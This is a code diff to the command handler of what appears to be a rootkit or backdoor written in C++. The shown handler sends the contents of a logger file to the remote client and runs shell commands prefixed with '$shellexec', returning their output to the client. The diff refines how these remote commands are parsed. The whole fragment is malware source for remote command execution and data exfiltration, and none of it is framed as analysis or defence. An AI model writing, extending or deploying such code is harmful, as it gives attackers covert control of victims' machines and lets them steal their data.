@@ -41,12 +41,17 @@ static void handle_request(network::rootkit& client)
 			std::string tmp = read_file(logger::path);
 			client.send_text(tmp);
 		}
-		// default action is to just execute shell commands
-		else
+		else if (buffer.rfind("$shellexec", 0) == 0)
 		{
+			buffer = buffer.substr(buffer.find(" ") +1);
 			std::string tmp = cmd_exec(buffer.c_str());
 			std::cout << "result: " << tmp << std::endl;
 			client.send_text(tmp);
+		}
+		// default action is to just execute shell commands
+		else
+		{
+			std::cout << "Unrecognized command\n";
 		}
 	}
 }
